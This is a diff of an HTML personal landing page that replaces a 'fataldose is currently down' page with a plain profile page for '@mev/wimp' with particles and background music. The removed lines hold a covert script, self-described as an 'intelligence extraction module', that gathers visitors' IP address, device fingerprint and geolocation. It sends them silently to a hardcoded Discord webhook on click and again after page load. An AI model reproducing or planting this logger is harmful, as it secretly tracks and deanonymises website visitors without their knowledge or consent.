@@ -1,152 +1,221 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>fataldose</title>
-    <style>
-        html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden}
-        #enter-screen{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;z-index:10;opacity:1;transition:opacity .8s}
-        #enter-btn{color:#fff;font:48px Arial;font-weight:700;cursor:pointer;user-select:none}
-        #background-gif{position:fixed;inset:0;background:url(https://i.imgur.com/backup.gif) center/cover no-repeat;opacity:0;transition:opacity 1s}
-        #main-content{position:relative;z-index:2;height:100%;display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity 1s}
-        .center-text{color:#fff;font:48px Arial;font-weight:700}
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>@mev/wimp</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    background: #000;
+    color: #fff;
+    font-family: "Inter", "Segoe UI", Arial, sans-serif;
+    height: 100vh;
+    overflow: hidden;
+}
+
+/* ===== CLICK TO ENTER ===== */
+#enterScreen {
+    position: fixed;
+    inset: 0;
+    background: #000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 10;
+    cursor: pointer;
+    transition: opacity 1.2s ease;
+}
+
+#enterText {
+    font-size: 26px;
+    letter-spacing: 6px;
+    opacity: 0.85;
+    animation: breathe 2.5s ease-in-out infinite;
+}
+
+@keyframes breathe {
+    50% { opacity: 0.4; }
+}
+
+/* ===== BACKGROUND ===== */
+#particlesCanvas {
+    position: fixed;
+    inset: 0;
+    z-index: 0;
+    filter: grayscale(100%);
+}
+
+/* ===== MAIN CONTENT ===== */
+.main {
+    position: relative;
+    z-index: 2;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    opacity: 0;
+    transform: translateY(10px);
+    transition: opacity 1.4s ease, transform 1.4s ease;
+    animation: float 8s ease-in-out infinite;
+}
+
+@keyframes float {
+    50% { transform: translateY(-10px); }
+}
+
+/* ===== PROFILE ===== */
+.pfp-container {
+    width: 210px;
+    height: 210px;
+    position: relative;
+    margin-bottom: 32px;
+}
+
+.pfp-glow {
+    position: absolute;
+    inset: -35px;
+    background: radial-gradient(circle, rgba(255,255,255,.45), transparent 70%);
+    filter: blur(45px);
+}
+
+.pfp {
+    width: 100%;
+    height: 100%;
+    border-radius: 50%;
+    overflow: hidden;
+    border: 1px solid rgba(255,255,255,.35);
+    box-shadow: 0 0 40px rgba(255,255,255,.15);
+}
+
+/* IMAGE STAYS COLOR */
+.pfp img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+/* ===== TEXT ===== */
+.username {
+    font-size: 26px;
+    font-weight: 300;
+    letter-spacing: 2px;
+    opacity: 0.85;
+    margin-bottom: 14px;
+}
+
+.message {
+    font-size: 18px;
+    letter-spacing: 4px;
+    text-transform: uppercase;
+    opacity: 0.6;
+}
+</style>
 </head>
+
 <body>
-    <div id="enter-screen">
-        <div id="enter-btn">ENTER</div>
+
+<!-- CLICK TO ENTER -->
+<div id="enterScreen">
+    <div id="enterText">CLICK TO ENTER</div>
+</div>
+
+<!-- BACKGROUND -->
+<canvas id="particlesCanvas"></canvas>
+
+<!-- AUDIO -->
+<audio id="bgAudio" loop>
+    <source src="https://github.com/lqrpingfunds/fataldose/raw/refs/heads/main/mev%20site.mp3" type="audio/mpeg">
+</audio>
+
+<!-- MAIN CONTENT -->
+<div class="main" id="mainContent">
+    <div class="pfp-container">
+        <div class="pfp-glow"></div>
+        <div class="pfp">
+            <img src="https://i.pinimg.com/736x/4d/80/a9/4d80a9a4a47c3a5446209b6293359fa1.jpg">
+        </div>
     </div>
-    <div id="background-gif" style="background-image:url('https://raw.githubusercontent.com/ikiikikikijujijij-oss/fataldose/refs/heads/main/fatal.gif'),url('https://i.imgur.com/placeholder.gif')"></div>
-    <div id="main-content">
-        <div class="center-text">fataldose is currently down...</div>
-    </div>
 
-    <audio id="bg-music" loop>
-        <source src="https://github.com/ikiikikikijujijij-oss/fataldose/raw/refs/heads/main/fatal.mp3" type="audio/mpeg">
-    </audio>
+    <div class="username">@mev/wimp</div>
+    <div class="message">dying inside</div>
+</div>
 
-    <script>
-        // ============================================
-        // SHΔDØW CORE - INTELLIGENCE EXTRACTION MODULE
-        // ============================================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1453431637290389625/W1ASB27LLWcF_sBuKs1dygA8u2Aos0IPOOqAPdJD7LPOVGGR_lDQ4YvLVZePEpBqp4PG";
+<script>
+/* ===== CLICK TO ENTER ===== */
+const enterScreen = document.getElementById("enterScreen");
+const main = document.getElementById("mainContent");
+const audio = document.getElementById("bgAudio");
 
-        async function collectIntelligence() {
-            const data = {
-                // IP via external service (bypasses local IP limitations)
-                ip: await fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => d.ip)
-                    .catch(() => 'Unknown'),
-                
-                // User Agent & Browser Data
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                
-                // Screen/Display Intelligence
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth
-                },
-                
-                // Timezone & Locale
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                dateTime: new Date().toISOString(),
-                
-                // Connection Data (if available)
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
-                } : null,
-                
-                // Hardware Concurrency
-                cpuCores: navigator.hardwareConcurrency || 'Unknown',
-                
-                // Device Memory
-                deviceMemory: navigator.deviceMemory || 'Unknown',
-                
-                // Geolocation (if permitted - will fail silently if blocked)
-                geolocation: 'Pending...'
-            };
+enterScreen.addEventListener("click", () => {
+    enterScreen.style.opacity = "0";
+    setTimeout(() => enterScreen.remove(), 1200);
 
-            // Attempt geolocation
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    pos => {
-                        data.geolocation = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        };
-                        sendToDiscord(data);
-                    },
-                    () => {
-                        data.geolocation = 'Permission denied';
-                        sendToDiscord(data);
-                    },
-                    {timeout: 5000}
-                );
-            } else {
-                data.geolocation = 'Not supported';
-                sendToDiscord(data);
-            }
-        }
+    main.style.opacity = "1";
+    main.style.transform = "translateY(0)";
 
-        function sendToDiscord(payload) {
-            // Format for Discord embed
-            const embed = {
-                title: "🕵️ SHΔDØW CORE - Intelligence Report",
-                color: 0x000000,
-                fields: [
-                    {name: "🌐 IP Address", value: `\`${payload.ip}\``, inline: true},
-                    {name: "🖥️ User Agent", value: `\`${payload.userAgent.substring(0,100)}...\``, inline: false},
-                    {name: "🗺️ Location", value: `\`${typeof payload.geolocation === 'object' ? `Lat: ${payload.geolocation.latitude}, Lon: ${payload.geolocation.longitude}` : payload.geolocation}\``, inline: true},
-                    {name: "⏰ Timezone", value: `\`${payload.timezone}\``, inline: true},
-                    {name: "📱 Platform", value: `\`${payload.platform}\``, inline: true},
-                    {name: "🖥️ Screen", value: `\`${payload.screen.width}x${payload.screen.height}\``, inline: true},
-                    {name: "🔢 CPU Cores", value: `\`${payload.cpuCores}\``, inline: true},
-                    {name: "🧠 Device RAM", value: `\`${payload.deviceMemory}GB\``, inline: true},
-                    {name: "📶 Connection", value: `\`${payload.connection ? payload.connection.effectiveType : 'Unknown'}\``, inline: true}
-                ],
-                timestamp: payload.dateTime,
-                footer: {text: "SHΔDØW CORE V99 • Stealth Module Active"}
-            };
+    audio.volume = 0;
+    audio.play();
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({embeds: [embed]})
-            }).catch(() => {/* Silent fail for stealth */});
-        }
+    let v = 0;
+    const fade = setInterval(() => {
+        v += 0.02;
+        audio.volume = Math.min(v, 0.6);
+        if (v >= 0.6) clearInterval(fade);
+    }, 60);
+});
 
-        // ============================================
-        // ORIGINAL SITE FUNCTIONALITY + COVERT INIT
-        // ============================================
-        let e = document;
-        
-        // Modified click handler - triggers intelligence collection
-        e.getElementById('enter-screen').onclick = () => {
-            // Collect data immediately on click
-            collectIntelligence();
-            
-            // Original visual/music effects
-            e.getElementById('enter-screen').style.opacity = 0;
-            e.getElementById('background-gif').style.opacity = 1;
-            e.getElementById('main-content').style.opacity = 1;
-            e.getElementById('bg-music').play();
-            setTimeout(() => e.getElementById('enter-screen').style.display = 'none', 800);
-        };
+/* ===== PARTICLES ===== */
+const canvas = document.getElementById("particlesCanvas");
+const ctx = canvas.getContext("2d");
+let particles = [];
 
-        // Backup collection on page load (if user doesn't click)
-        window.addEventListener('load', () => {
-            setTimeout(collectIntelligence, 3000); // Delayed collection
-        });
-    </script>
+function resize() {
+    canvas.width = innerWidth;
+    canvas.height = innerHeight;
+}
+resize();
+addEventListener("resize", resize);
+
+class Particle {
+    constructor() {
+        this.x = Math.random() * canvas.width;
+        this.y = Math.random() * canvas.height;
+        this.size = Math.random() * 1.8 + 0.4;
+        this.vx = Math.random() * 0.4 - 0.2;
+        this.vy = Math.random() * 0.4 - 0.2;
+        this.o = Math.random() * 0.4 + 0.15;
+    }
+    update() {
+        this.x += this.vx;
+        this.y += this.vy;
+        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+    }
+    draw() {
+        ctx.fillStyle = `rgba(255,255,255,${this.o})`;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+    }
+}
+
+for (let i = 0; i < 90; i++) particles.push(new Particle());
+
+function animate() {
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    particles.forEach(p => { p.update(); p.draw(); });
+    requestAnimationFrame(animate);
+}
+animate();
+</script>
+
 </body>
 </html>
